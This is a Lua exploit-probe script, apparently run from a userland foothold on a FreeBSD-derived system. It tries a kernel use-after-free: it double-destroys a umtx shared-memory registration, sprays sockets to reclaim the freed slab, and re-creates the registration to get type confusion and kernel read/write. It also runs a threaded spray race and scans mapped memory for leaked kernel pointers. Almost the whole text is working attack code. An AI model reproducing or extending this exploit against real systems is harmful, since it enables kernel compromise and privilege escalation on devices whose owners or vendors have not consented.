-- CRASH_CLASS: MODERATE
-- PROBE 152f: SHM slab reclaim via socket spray after double-destroy
--
-- Context: 152e confirmed threading + double-destroy both work.
-- Double-destroy returns 0 on both, alive() returns 0 after (dangling ref).
-- Now: exploit the dangling reference.
--
-- Strategy:
-- 1. Create SHM registration → kernel allocates umtx_shm_reg struct
-- 2. Double-destroy → struct freed but reference may linger
-- 3. Spray sockets/pipes → kernel allocates socket structs from same slab
-- 4. Create SHM with same key → hits dangling ref → type confusion
-- 5. Read/write through confused object → kernel R/W
--
-- The umtx_shm_reg struct contains:
--   - uskr_refcnt (refcount)
--   - uskr_obj (pointer to shared memory object)
--   - uskr_key (umtx key - pid, type, addr/offset)
--   - uskr_list (LIST_ENTRY - fwd/back pointers into global list)

print("=== PROBE 152f: SHM SLAB RECLAIM ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)
local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_pipe2 = make_syscall(687)  -- pipe2 with flags
local sc_mmap = make_syscall(477)

-- Verify globals
if not libc_addrofs or not libc_addrofs.Thrd_create then
    print("ERROR: no threading"); print("canary=" .. pid); return
end
local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

-- ============================================================
-- SECTION A: Measure SHM allocation size
-- Compare GPU mmap fingerprints before/after SHM alloc
-- ============================================================
print("")
print("--- SECTION A: SHM SIZE FINGERPRINT ---")

-- Allocate a GPU region as our probe area
local ok_g, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not ok_g then
    print("gpu mmap failed")
    print("canary=" .. pid); return
end
local gh, gl = get_hi_lo(gpu)
print(string.format("gpu=0x%X%08X (256KB)", gh, gl))

-- Snapshot GPU before SHM
local snapshot1 = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local val = safe_rq(gpu + off)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then
            snapshot1[off] = {vh, vl}
        end
    end
end
local nz_count = 0
for _ in pairs(snapshot1) do nz_count = nz_count + 1 end
print("pre_shm_nonzero=" .. nz_count)

-- ============================================================
-- SECTION B: Socket spray pre-positioning
-- Create many sockets to fill the current slab
-- ============================================================
print("")
print("--- SECTION B: SOCKET SPRAY BASELINE ---")

local base_fds = {}
for i = 1, 64 do
    local ok, fd = pcall(function()
        return sc_socket(uint64(2), uint64(1), uint64(0))
    end)
    if ok and to_num(fd) >= 0 then
        base_fds[#base_fds + 1] = to_num(fd)
    end
end
print("baseline_sockets=" .. #base_fds)
if #base_fds > 0 then
    print("fd_range=" .. base_fds[1] .. "-" .. base_fds[#base_fds])
end

-- Close them to create holes
for _, fd in ipairs(base_fds) do
    pcall(function() sc_close(uint64(fd)) end)
end
print("closed baseline sockets (holes created)")

-- ============================================================
-- SECTION C: SHM create → double-destroy → socket spray → re-create
-- The exploit sequence
-- ============================================================
print("")
print("--- SECTION C: SHM EXPLOIT SEQUENCE ---")

local key = memory.alloc(0x20)
local results = {}

for trial = 1, 10 do
    memory.write_qword(key, uint64(0xEE000000 + trial))

    -- Step 1: Create SHM registration
    local ok_c, rc = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- Step 2: Double-destroy (frees the struct)
    local ok_d1, rd1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    local ok_d2, rd2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    -- Step 3: Socket spray to reclaim freed slab
    local spray_fds = {}
    for i = 1, 32 do
        local ok_s, fd = pcall(function()
            return sc_socket(uint64(2), uint64(1), uint64(0))
        end)
        if ok_s and to_num(fd) >= 0 then
            spray_fds[#spray_fds + 1] = to_num(fd)
        end
    end

    -- Step 4: Re-create SHM with same key (hits reclaimed slab?)
    local ok_r, rr = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- Step 5: Check alive (should be alive if re-created)
    local ok_a, ra = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)

    local rv_c = ok_c and to_num(rc) or -999
    local rv_d1 = ok_d1 and to_num(rd1) or -999
    local rv_d2 = ok_d2 and to_num(rd2) or -999
    local rv_r = ok_r and to_num(rr) or -999
    local rv_a = ok_a and to_num(ra) or -999

    results[trial] = {c=rv_c, d1=rv_d1, d2=rv_d2, spray=#spray_fds, r=rv_r, a=rv_a}
    print(string.format("trial%02d: c=%d d1=%d d2=%d spray=%d recreate=%d alive=%d",
        trial, rv_c, rv_d1, rv_d2, #spray_fds, rv_r, rv_a))

    -- Clean up spray sockets
    for _, fd in ipairs(spray_fds) do
        pcall(function() sc_close(uint64(fd)) end)
    end

    -- Clean up SHM
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
end

-- ============================================================
-- SECTION D: GPU mmap scan after exploit sequence
-- ============================================================
print("")
print("--- SECTION D: POST-EXPLOIT GPU SCAN ---")

local kptr = 0
local interesting = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local val = safe_rq(gpu + off)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr = kptr + 1
            if #interesting < 10 then
                interesting[#interesting + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("kptr=" .. kptr)
for _, s in ipairs(interesting) do print(s) end

-- ============================================================
-- SECTION E: Threaded socket spray during SHM race
-- Spawn threads that create heap pressure while main does SHM
-- ============================================================
print("")
print("--- SECTION E: THREADED SPRAY RACE ---")

local race_counter = memory.alloc(64)
memory.write_qword(race_counter, uint64(0))

-- Spawn 3 threads for background heap activity
local threads = {}
for i = 1, 3 do
    local tb = memory.alloc(8)
    memory.write_qword(tb, uint64(0))
    local ok, ret = pcall(thrd_create_fn, tb, libc_addrofs.Atomic_fetch_add_8, race_counter)
    if ok and to_num(ret) == 0 then
        threads[#threads + 1] = memory.read_qword(tb)
    end
end
print("race_threads=" .. #threads)

-- While threads run: rapid SHM create/double-destroy/recreate
local anomalies = 0
for i = 1, 200 do
    memory.write_qword(key, uint64(0xFF000000 + i))

    -- Create
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- Double-destroy
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    -- Socket spray (small burst)
    local fds = {}
    for j = 1, 8 do
        local ok_s, fd = pcall(function()
            return sc_socket(uint64(2), uint64(1), uint64(0))
        end)
        if ok_s and to_num(fd) >= 0 then
            fds[#fds + 1] = to_num(fd)
        end
    end

    -- Re-create SHM — check for anomalies
    local ok_r, rr = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok_r and to_num(rr) ~= 0 then
        anomalies = anomalies + 1
        print(string.format("ANOMALY i=%d recreate=%d", i, to_num(rr)))
    end

    -- Clean up
    for _, fd in ipairs(fds) do
        pcall(function() sc_close(uint64(fd)) end)
    end
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
end
print("race_cycles=200 anomalies=" .. anomalies)

-- Join threads
for _, tid in ipairs(threads) do
    pcall(thrd_join_fn, tid, uint64(0))
end
print("threads joined")

-- ============================================================
-- SECTION F: Final GPU scan
-- ============================================================
print("")
print("--- SECTION F: FINAL GPU SCAN ---")
local kptr2 = 0
local samples2 = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local val = safe_rq(gpu + off)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr2 = kptr2 + 1
            if #samples2 < 10 then
                samples2[#samples2 + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("final_kptr=" .. kptr2)
for _, s in ipairs(samples2) do print(s) end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152f COMPLETE ===")
